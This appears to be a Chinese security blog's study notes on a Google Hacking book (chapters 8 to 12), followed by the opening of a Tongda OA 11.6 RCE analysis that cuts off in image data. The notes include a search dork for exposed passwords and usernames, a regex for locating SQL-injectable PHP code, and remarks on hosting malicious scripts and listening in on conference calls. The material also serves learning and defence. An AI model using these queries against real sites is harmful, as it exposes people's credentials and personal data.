<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6938.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6942.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6944.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6947.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6949.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6951.png" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6954.png" alt="0"></p>
</li>
</ul>
<p>  <strong>使用并且查找各种Web工具</strong></p>
<ul>
<li><p>虽然Google强大且灵活，但它并不是无所不能的。有时候，如果不用Google反而更简单。当不使用Google来执行类似与WHOIS查询，“pings”，traceroute以及端口扫描等任务时，更为简单方便。</p>
</li>
<li><p>NQT网络查询工具（Network Query Tool）。<a href="http://www.shipmail.gr/index.php">http://www.shipmail.gr/index.php</a></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/6978.png" alt="0"></p>
</li>
<li><p>默认的NQT安装允许任何网络用户执行IP主机名和地址查询，DNS查询，WHOIS查询，端口测试与traceroute。NQT是一个基于Web的程序，意思是说任何能够访问该页面的用户都可以对任意目标执行这些功能。器服务器会掩盖用户的真实地址。如果使用一个匿名代理服务器，则可以进一步的隐藏用户的真实身份        //NQT程序也打接受远程的POST请求</p>
</li>
</ul>
<p>  <strong>8.4 瞄准使用Web的网络设备</strong></p>
<ul>
<li>各种网络设备都可以用Google查询搜索到。对某些攻击者而言，这些设备不仅知识满足他们技术上的好奇，许多由Web链接了的设备配置不当，而且安全审计人员通常会忽视那些可信的设备。网络摄像头就是一种被忽视的设备，它能够给攻击者提供目标的内部情况，即使只有相当少的一部分目标安装了网络摄像头。当网络打印机被攻陷时，会泄露大量的敏感信息，尤其是对攻击者而言，他们可以查看打印作业和网络信息。</li>
<li>许多网络设备都预安装一个Web接口以雨荨管理员查询设备的状态或者通过Web浏览器来改变设备的设置</li>
</ul>
<p>  <strong>8.5 查找各种网络报告</strong></p>
<ul>
<li>网络文档和状态报告，它们能够让外部人员访问所有的信息，从网络上的IP地址到完整的，可用的网络图表    </li>
<li>来自这些信息可以用来帮助创建网络映射</li>
</ul>
<p>  <strong>8.6 查找网络硬件</strong></p>
<ul>
<li><p>一个连接到网络的设备通常都具有某种Web页面。如果该设备连接到了互联网上，斌且曾经在一个到该设备的Web页面的链接，那么很有可能该页面存在于Google的数据库之中，等待某个灵巧的查询找到它</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7046.png" alt="0"></p>
</li>
</ul>
<p>  <strong>8.7 总结即一些感想</strong></p>
<ul>
<li>攻击者使用Google由多种目的。攻击者可能拥有一个针对某个Web软件特定版本的漏洞利用程序</li>
<li>目录列表可以提供设备上所用的软件版本信息。</li>
<li>服务器报错也会泄露大量的信息</li>
<li>登陆入口也是攻击的一个手段</li>
<li>总的来说还是一个固定不变的思想有输入就有攻击，你有反应我就可以作事情，查询一些以有的东西来帮助我做一些事情</li>
</ul>
<p>  <strong>第九章 用户名、口令和其他秘密信息</strong></p>
<p>  <strong>9.1 简介</strong></p>
<ul>
<li>这一章的内容不是关于在评估过程中查找敏感数据的，而是关于为了搜索这些数据，那些“坏人”可能会做什么。这一章所提到的例子通常都代表了最常见的安全问题。黑客在每次攻击时都要瞄准这些信息。为了对抗这类攻击者。我们必须十分明确这种攻击会造成的最坏的可能。但是，我们也不用过于了解这些最坏的可能。请不要告诉那些有坏信息的人一些他们尚不知道的观念</li>
</ul>
<p>  <strong>9.2搜索用户名</strong></p>
<ul>
<li><p>大多数认证系统都是使用用户名和口令来保护信息。为了达到突破这类保护的“前门”的目的，你需要判断用户以及口令。</p>
</li>
<li><p>能够在许多地方找到用户名，某些时候，可能需要挖掘文档或E-mail目录</p>
</li>
<li><p>一个想“your username is” 这样简单的查询都能有效地搜索用户名</p>
</li>
<li><p>在一些帮助文档中包括了一些默认的用户和密码</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7108.png" alt="0"></p>
</li>
<li><p>搜索已知的文件名来查找是否存在信息</p>
</li>
<li><p>在Windows注册表保存了各种认证信息，包括用户名和口令，虽然不可能（很少）在Web中搜索到可用的，导出了的Windows注册表文件，但是这都是一种思想</p>
</li>
<li><p>可以在公共目录中查找多次，最终会得到接近于包含所有用户信息的列表</p>
</li>
</ul>
<p>  <strong>9.3搜索口令</strong></p>
<ul>
<li><p>口令数据是渗透测试中的“圣杯”之一，它应该收到保护。遗憾的是。有许多可以用来在网络上搜索口令查询Google查询的例子</p>
</li>
<li><p>一个类似于“Your password” forgot这样简单的查询能够找到提供忘记口令回复机制的页面</p>
</li>
<li><p>intext:(password | passcod | pass) intext:(username | userid | user)是另外一种针对口令信息的通用搜索 </p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7137.png" alt="0"></p>
</li>
<li><p>下面是各种语言password的翻译文</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7142.png" alt="0"></p>
</li>
</ul>
<p>  <strong>9.4 搜索信用卡账号和社保号码等</strong></p>
<ul>
<li>随着互联网上不可靠的零售商越来越多，出现如此多的信用卡欺骗现象也就没有什么可奇怪的了。并不是只有这些小规模的零售商会受到黑客的攻击。这些年来，成败上千个大新企业的财务数据库也受到了攻击，有些受害公司还是技术比较好并且也非常主义防止攻击的公司</li>
<li>大多书情况下，包含这些账号的页面都不是从在线零售商或者电子商务网站”泄露出去的“，而很有可能是网络钓鱼欺骗结果。网络钓鱼欺骗是通过电话或者E-mail欺骗用户的个人信息</li>
<li>甚至一些不负责任的新闻渠道泄漏了能够查找这些信息的功能查询，还可以通过搜索特定的文件扩展名来查找</li>
</ul>
<p>  <strong>9.4.1 社保账号</strong></p>
<ul>
<li>社保号码和其他铭感数据也可以很容易地通过Google查找到，所用的技术和搜索信用卡账号的技术相同</li>
</ul>
<p>  <strong>9.4.2 个人财务数据</strong></p>
<ul>
<li><p>在某些情况下，公布个人消息的责任在于钓鱼欺骗，在其他一些情况下，侵犯个人隐私就要归咎于那写攻击网上零售商的黑客了。随这当今社会个人电脑数量的快速增长，差不多有上百种个人财务程序供用户选择使用。许多这种程序都会创建带有特定文件扩展名的数据文件</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7185.png" alt="0"></p>
</li>
</ul>
<p>  <strong>9.5搜索其他有利可图的信息</strong></p>
<ul>
<li><p>Google能找到的但是很难归类的数据。这些数据包括地址簿、聊天日志文件、以及网络漏洞报告等，这些网上的敏感数据都是很有价值的。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/7194.png" alt="0"></p>
</li>
<li><p>Nessus安全扫描工具的输出。Nessus可以在<a href="http://www.nessus.org上获得。这个很棒的开源工具能够对目标执行一系列的安全测试，并报告各种可能的漏洞">www.nessus.org上获得。这个很棒的开源工具能够对目标执行一系列的安全测试，并报告各种可能的漏洞</a></p>
</li>
</ul>
<p>  <strong>9.6 总结</strong></p>
<ul>
<li>不要犯任何错误，因为在网上存在各种敏感的数据，而且Google能够找到这些数据。除非你能够给出恰当的查询，否则可搜索的信息机会没有任何限制。用户名、口令、信用卡账号、社保号码和个人财务数据这些信息都在可搜索的范围内。</li>
<li>一个泄露的口令就能够提供关于用于其他系统上的口令的线索。大多数策略都进制这种口令共享，但是这种限制通常很难执行</li>
</ul>
<p>  <strong>第十章 hacking Google 服务</strong></p>
<p>  <strong>10.1 AJAX Search API</strong></p>
<ul>
<li>AJAX Search API是AJAX前端的主要的Google服务。该项服务有意取代旧的SOAP搜索服务，而SOAP搜索服务的支持在不久前已经被废止了。AJAX Search API被认为是比SOAP服务更强大的一个服务，并且更容易使用。</li>
<li>该服务的主要目标是使外部网能够寄存Google供给的技术，这些技术提供了位域寄存在Web站点内、外的搜索工具，并且可以是视频剪辑、地图、博客、自定义搜索引擎等等中的一个</li>
</ul>
<p>  <strong>10.1.1 嵌入式Google AJAX Search API</strong></p>
<ul>
<li><p>Google AJAX Search API 设计为嵌入到外部页内。这使得服务箱单更有用，因为我们可以指导自定义界面来获得更好的对Google底层结构的访问。为了着手启用Google AJAX Search API 你需要理解JavaScrippt和AJAX编程以及你要自行生成的API密钥。</p>
</li>
<li><p>XSS和AJAX蠕虫</p>
</li>
<li><p>该技术可以通过XSS/AJAX蠕虫来实现目标搜索并且利用目标来获取有用的信息，因此要确保将来的繁殖。XSS/AJAX蠕虫通常都在源域中繁殖和传播。这是因为JavaScript没有执行跨站点请求的能力。本章提到的该技术语序蠕虫绕过JacaScript的限制，并且可以访问在线的其他资源</p>
</li>
</ul>
<p>  <strong>10.2 Calendar</strong></p>
<ul>
<li>Google calendar 是一个功能强大的日历管理应用程序，它支持类似日历共享、邀请创建、搜索以及日历发布。该服务也可以于Google Mail （Gmail）结合起来，并且可以通过移动设备来访问。</li>
<li>因为单个用户可以维护其他用户可能更也很感兴趣的时间列表以及入理。所以calendar共享是一个非常有用的功能。</li>
<li>共享的日历，通常。甚至是执行那些最基本的搜索时，都完全有可能无意间发现那些可以执行恶意目的的铭感信息</li>
<li>例如泄露了几个预定的电话会议。注意，会议电话号码和访问代码也列了出来，你可通过对于会议的秘密听取来获得你想要的信息，或者用一些简单的账户密码的搜索来找到一些你想要的信息</li>
</ul>
<p>  <strong>10.3 Blogger和Google的Blog Search</strong></p>
<ul>
<li>Blogger时Google的博客软件，它位于blogger。com和blogspot。com之上。Blogger是使用得最广泛的博客之一。他允许多个博客实时创建，并且具有一些与其他软件合作并且避免注释和引用垃圾博客的功能</li>
<li>Splog的搜索引擎的排名在不断地提升，所以他会吸引更多的访问者。如果攻击者拿下了Web浏览器的Splog页面上的漏洞应用的话，他就应该在瞬间接管上百台机器</li>
</ul>
<p>  <strong>10.4 信号报警</strong></p>
<ul>
<li>google alerts是一个强大的工具，可以用来发觉查询结果合适变化。该系统可以被修改为每天或者每周都发送更新，亦或者是有更新时发送更新</li>
<li>这是一个很出色的工具，它还可以用于更有趣的目的。假设、我们知道目标服务器使用Mysql作为数据库终端。我们可以使用Google Alerts 来查询目标，并且在出现错误时搜索错误信息</li>
<li>为警报类型选择Web—通常这是默认的选项。选项警报的频率以及你的E-mail地址并且单击Create Alert（创建警报）</li>
<li>恶意用户可以使用该服务来警示目标站点上出现的漏洞和有趣信息。这个警示的配置非常低，并不会让目标有所警惕，该业务发生在用户和Google之间。攻击者甚至可以碰到Google Hacking Database中所有条目的警报。</li>
</ul>
<p>  <strong>10.5 Google Co-op</strong></p>
<ul>
<li>Google Co-op（<a href="http://www.google.com/coop）是一个非常强大的服务，允许你创建一个强大的自定义搜索引擎。你不需要为了使用该服务而注册为Google用户，但是如果你需要创建一个引擎，则需要注册">www.google.com/coop）是一个非常强大的服务，允许你创建一个强大的自定义搜索引擎。你不需要为了使用该服务而注册为Google用户，但是如果你需要创建一个引擎，则需要注册</a></li>
</ul>
<p>  <strong>10.6 Google Code</strong></p>
<ul>
<li>Google Code是对允许提供全免费项目的开源代码社区的最大的恩惠。在功能方面，该服务与很多人都知道的Sourceforge十分相似。通过SVN，为研发者提供了Wiki来寄存项目文档、Bug跟踪体系以及版本控制</li>
<li>Google Code不只是一个开发环境，他还是一个免费的寄存提供者。我们可以使用该系统来隐藏此处的所有信息</li>
</ul>
<p>  <strong>10.6.1 SVN简介</strong></p>
<p>  <strong>10.6.2 在线获取文件</strong></p>
<ul>
<li>一旦你的项目提交到源库中，你便可以在线访问它的内容。你可以通过访问<a href="http://projectname.googlecode.com/svn/trunk来获取提交的项目。记住，提交的文件可以作为内容形式的文件/明码或者内容形式的应用程序/八位字节流使用，这样一来便可以防止它们在浏览器中被解析。这意味着，理论上，你应该能查看/预览上传的图片或者HTML文件">http://projectname.googlecode.com/svn/trunk来获取提交的项目。记住，提交的文件可以作为内容形式的文件/明码或者内容形式的应用程序/八位字节流使用，这样一来便可以防止它们在浏览器中被解析。这意味着，理论上，你应该能查看/预览上传的图片或者HTML文件</a></li>
<li>尽管这样，攻击者扔旧可以寄存恶意脚本，该脚本可以利用带有漏洞的浏览器，允许系统控制访问者的浏览器。这正是我们着手查看Google Code开发平台真正潜力的入口。没有任何东西可以防止攻击者在线寄存他们的恶意文件，防止攻击者使用它们来攻击无辜的人。因为ISP（互联网服务提供商）不能完全地组织Google来停止恶意传播，所以这种情况很值得关注。很多用户的处境都不容乐观</li>
<li>哪些熟悉IDS（侵入检测系统）和IPS（侵入预防系统）的人之所以会反对是因为恶意软件也可以通过将签名设置为可以在流行防火墙产品以及诸如Snort之类的开发源项目中找到的签名来查找。因为Google Code的加密选项，在绝大多数时间，攻击者都不会被察觉。正如我们知道的，加密通信能确保隐私的安全。Google为寄存的项目提供了SSL连接</li>
</ul>
<p>  <strong>10.6.3 查找代码</strong></p>
<ul>
<li><p>我们还可以用Google Code来查询代码，用一些正则表达式来精确的搜索一些我们想要的阿东西</p>
</li>
<li><p>例如查找SQL注入漏洞：</p>
<p>mysql_query.*?_GET lang:php</p>
</li>
<li><p>该查询以关键字mysql_query开头——mysql_query是PHP里的标准函数。接着，我们使用.*?序列查找未定义的字符数。最后，在查找HTTP GET参数的关键字_GET。通常，我们查找的SQL查询由$_GET控制。对基于$_POST的SQL注入攻击应用也可以采用相似的策略。记住，本章的实例仅是我们可以进行测试的实例的一小部分变体。Google Code Search是一个非常有用的可以在很多语种中查找漏洞的工具</p>
</li>
</ul>
<p>  <strong>10.7 一些想法</strong></p>
<ul>
<li>我们可以使用Google Code Search在我们自己的项目中查找字符串。如果我们有一个巨大的数据集要分析，我们可以简单地将它上传到代码中，并且等待Google机器人程序将它找出来。接着，我们可以使用标准的正则表达式查询来查找我们最感兴趣的数据</li>
<li>对于一些工具我们可以根据他的源码和一些反应来自己创立一个属于自己的工具来做一些自己想做的事情</li>
</ul>
<p>  <strong>第十一章 Google Hacking案例</strong></p>
<p>  <strong>11.1 简介</strong></p>
<ul>
<li>Google 黑客会花上好几个小时在互联网上查找丰富的资源。通过一轮又一轮的搜索，他们会因找到清晰易读的，有意义的的搜索而欣喜若狂。之所以我了解这些是因为我亲眼目睹了这一过程。具有创造力的Google搜索可以泄露医药、金融、所有权甚至是机密信息。尽管政府颁布了法令、规章及保护法案，诸如HIPPA，且不断设置安全装置，这一问题仍然存在。信息仍会驱使网络中这一问题的发生，而这正好被Google黑客逮个正着</li>
</ul>
<p>  <strong>11.2 低级信息</strong></p>
<ul>
<li>我们将要一同来看一下由Google黑客揭秘的一些更有趣的技术。我们将从查看多种确实无关的、除非你的目标是帮助黑客的工具着手进行。接着，我们将要查看开放的网络设备，并且打开应用程序，它们都不涉及任何真正的可以使用的攻击</li>
</ul>
<p>  <strong>11.2.1 工具</strong></p>
<ul>
<li>任何黑客都有一个由他自行支配的工具基金，但是本节奏要探讨的该工具的有趣部分是：它们是在线的——它们在网络服务器上运行，且允许黑客有效地试探对该网络服务器的搜索。</li>
<li>与ping工具不同，finger工具已经很久没有投入使用了。这一烦人的服务允许攻击者查询UNIX机器上的用户，允许枚举各种信息，如用户连接时间、起始目录、全名以及其他的信息</li>
</ul>
<p>  <strong>11.2.2 开放的网络设备</strong></p>
<ul>
<li>对于所有在网络上开放和管理的网络设备你都可以去了解和控制</li>
<li>例如比较多的像摄像头，饮水机，打印机，自能手表等多种设备</li>
</ul>
<p>  <strong>11.2.3 开放的应用程序</strong></p>
<ul>
<li>相对而言，很多主流的Web应用程序都是傻子认证，它们是专门为那些对安全了解甚少而只懂点击操作的大部分人设计的。更重要的是Google攻击社区已经发现了成千上万个开放的在线应用程序，只需等待一个点击操作的脚本的出现并拥有它们即可</li>
<li>通常可以简单的去发现和控制一些网站甚至是一些服务器</li>
</ul>
<p>  <strong>11.3 摄像头</strong></p>
<ul>
<li>曾有一段时间，GHDB的所有附件就只有网络摄像头查询。尽管如此，有些网络摄像头查询。尽管如此，有些网络摄像头搜索还是十分有趣的。</li>
</ul>
<p>  <strong>11.4 电话设备</strong></p>
<ul>
<li>有些网络设备映射的网络暴露的大量的电话信息</li>
<li>有的管理系统甚至语序网络访问这连接会议电话、断开会议电话连接及监控会议电话，为与会者抓取快照，甚至是更改line(线路设置)，恶意的黑客甚至会更改系统名和密码，锁定合法管理者使其无法进入自己的系统</li>
</ul>
<p>  <strong>11.5 电源</strong></p>
<ul>
<li>当谈及使用Google攻击电源时，很多人都会感到怀疑。大多数人肯定在想是说UPS系统，对于网络上的一些有网络管理页面的系统来说都可以解决掉</li>
</ul>
<p>  <strong>11.6 敏感信息</strong></p>
<ul>
<li>敏感信息对于一些日志，文档，警务信息等都会泄露出大量的信息</li>
</ul>
<p>  <strong>11.7 社保号码</strong></p>
<ul>
<li>社保号码（SSN）是美国公民拥有的最敏感的信息。即使一个外行的罪犯也可以使用一个被到的SSN来开设一个银行账号，设置信用卡的最高限额以及其他的信息，所有均是以受害人的名义进行的。</li>
<li>对于一些Google泄露的信息来说大部分是攻击者从钓鱼网站上得来的</li>
</ul>
<p>  <strong>11.8 Google之外的信息</strong></p>
<ul>
<li>在某些情况下，Google都是长长的攻击链中的第一步。通过别的一些信息来获取到一些敏感的信息</li>
</ul>
<p>  <strong>11.9 总结</strong></p>
<ul>
<li>本章的所有内容都是关于Google攻击威胁被忽略后可能导致的严重错误。不论你何时身处严重的威胁都可以参看本章内容。请帮助传播这一信息，并且成为解决方案的一本而非问题的一本分。在想Google发送暂停或终止文件之前，记住——如果你的敏感数据使它成为在线内容，那么就不是Google的错了</li>
</ul>
<p>  <strong>第十二章 防卫Google黑客</strong></p>
<p>  <strong>12.1 简介</strong></p>
<ul>
<li>这本书的目的是在于帮助你理解Google黑客在攻击时可能采取的手段，这样你就能合理地保护自己和你的客户免于遭受这种似乎没有危险的威胁的侵害</li>
</ul>
<p>  <strong>12.2 完善且坚固的安全策略</strong></p>
<ul>
<li>应该把强制执行的，坚固的安全策略作为所有安全保障措施的基础</li>
<li>如果没有策略，那么你的安全防卫可能就会无效或者无法强制执行</li>
</ul>
<p>  <strong>12.3 Web服务器安全防护</strong></p>
<ul>
<li>目录列表、错误消息和不当的配置能提供大量信息</li>
<li>Robots.txt文件和特殊的META标记可以阻止搜索引擎Crawler访问特定的页面或目录</li>
<li>即使时最基本的口令机制都能阻止crawler访问受保护的内容</li>
<li>默认的页面和设置表明该服务器没有很好地维护而且会让该服务器成为黑客的一个目标</li>
</ul>
<p>  <strong>12.4 攻击你的站点</strong></p>
<ul>
<li>使用site操作符来浏览你负责保护的服务器，警惕任何不属于公开信息的页面</li>
<li>使用想Gooscan、Athena、GSI、Google Rower或者Advanced Dork这样的工具来评估你的网站的信息泄露情况。这些工具不使用Google API，所以要知道任何滥用或者过分的行为都会导致Google封掉你的IP段</li>
<li>使用像Wikto这样的工具也能攻击你的站点，而且这些工具使用了Google API，不会担心会被Google惩罚</li>
<li>利用Google hacking DATabase来跟踪最新的Google hacking查询。把GHDB和Gooscan、Athena或者Wikto这样的工具结合起来使用</li>
</ul>
<p>  <strong>12.5 从Google获取帮助</strong></p>
<ul>
<li>使用Google的Webmaster页面获取特殊的信息</li>
<li>使用Google的URL删除工具从Google数据库中删除敏感的数据</li>
</ul>
<p>  <strong>12.6 网站链接</strong></p>
<ul>
<li><a href="http://johnny.ihackstuff.com">http://johnny.ihackstuff.com</a> （GHDB），搜索引擎hacking论坛，Gooscan工具和GHDB导出文件的主页</li>
<li><a href="http://www.snakeoillabs.com">www.snakeoillabs.com</a>    Athena的主页</li>
<li><a href="http://www.seorank.com/robots-tutorial.htm">http://www.seorank.com/robots-tutorial.htm</a>    使用robots.txt文件的优秀指南</li>
<li><a href="http://www.sensepost.com/research/aura">www.sensepost.com/research/aura</a>          Sensepost的AURA,它可以模拟Google的SOAP API调用</li>
<li><a href="http://www.tankedgenius.com">http://www.tankedgenius.com</a>        JeffBall的Cp的GSI以及Google Rower工具的主页</li>
<li><a href="https://addons.mozilla.org/en-US/firfox/addon/2144">https://addons.mozilla.org/en-US/firfox/addon/2144</a>    Cp的Advanced Dork的主页</li>
</ul>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Google-Hacking</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA11.6 preAuth RCE分析</title>
    <url>/2020/09/13/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>该漏洞需要结合任意文件删除以及文件上传漏洞进行配合</p>
<h1 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h1><p>首先漏洞是在/module/appbuilder/assets/print.php</p>
<h3 id="img"><a href="#img" class="headerlink" title="img"></a><a href="data:image/png;base64,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